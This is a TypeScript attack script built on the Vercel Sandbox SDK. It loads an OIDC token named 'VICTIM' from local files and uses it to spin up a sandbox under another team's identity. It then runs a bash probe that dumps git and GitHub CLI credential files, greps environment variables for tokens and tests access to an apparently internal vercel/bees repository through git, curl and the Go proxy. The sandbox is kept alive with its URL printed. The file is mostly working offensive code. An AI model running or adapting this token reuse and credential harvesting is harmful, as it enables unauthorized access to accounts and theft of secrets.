import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const sbx = await Sandbox.create({
    name: "gh-probe-" + Date.now(),
    token: VICTIM, teamId, projectId,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports: [3000],
  });
  const SCRIPT = `
set +e
echo "===== git credenciales / config ====="
ls -la ~/.gitconfig ~/.netrc ~/.config/git/credentials 2>&1
cat ~/.gitconfig 2>/dev/null
echo "--- gh auth ---"
cat ~/.config/gh/hosts.yml 2>/dev/null
echo "===== env vars con github/token/git ====="
env | grep -iE 'github|git|token|gh_|proxy|go' | grep -viE '^GIT_SSL|^NPM_|CA|CURL|REQUESTS|CARGO|SSL|AWS_CA|NODE_' | head -30
echo "===== git ls-remote al repo interno bees ====="
timeout 15 git ls-remote https://github.com/vercel/bees.git HEAD 2>&1 | head -3
echo "--- ls-remote del paquete? (repo dir) ---"
timeout 15 git ls-remote https://github.com/vercel/bees 2>&1 | head -3
echo "===== curl a github.com/vercel/bees ====="
timeout 15 curl -s -o /dev/null -w '%{http_code}\n' https://github.com/vercel/bees 2>&1
timeout 15 curl -s -o /dev/null -w '%{http_code}\n' https://github.com/vercel/bees/tree/main/containers/sandbox-init 2>&1
echo "===== GOPROXY / go module fetch ====="
go env GOPROXY GONOSUMCHECK GOSUMDB 2>/dev/null
timeout 20 curl -s "https://proxy.golang.org/github.com/vercel/bees/containers/sandbox-init/@v/list" 2>&1 | head -5
echo "--- proxy.golang.org @latest ---"
timeout 20 curl -s "https://proxy.golang.org/github.com/vercel/bees/@v/list" 2>&1 | head -5
echo "===== DONE ====="
`;
  const r = await sbx.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 60_000 });
  console.log(await r.output("both"));
  console.log("NAME=" + (sbx as any).name);
  console.log("KEEP_ALIVE=" + sbx.domain(3000));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });